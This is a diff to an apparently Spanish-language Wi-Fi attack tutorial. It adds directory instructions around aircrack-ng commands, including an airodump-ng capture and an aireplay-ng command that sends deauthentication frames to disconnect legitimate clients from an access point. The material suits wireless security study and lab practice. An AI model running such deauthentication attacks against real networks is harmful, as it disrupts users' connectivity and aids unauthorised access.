@@ -267,6 +267,8 @@ sudo airodump-ng wlan1mon
 
 Volver a correr el comando, esta vez especificando ambos y un nombre para el output (archivos de salida) que nos servirán más adelante
 
+IMPORTANTE: Los comandos a continuación es necesario ejecutarlos desde el mismo directorio que en este caso será "Desktop"
+
 ```
 cd
 cd Desktop
@@ -278,6 +280,8 @@ En la parte inferior se muestran los dispositivos conectados al punto de acceso.
 En otra pestaña del terminal, vamos a desautenticar alguno de los dispositivos legítimos lanzando "tramas de desautenticación". Usar la columna STATION del elegido y nuevamente el BSSID del punto de acceso
 
 ```
+cd
+cd Desktop
 sudo aireplay-ng -0 5 -a [bssid] -c [station] wlan1mon
 ```
 
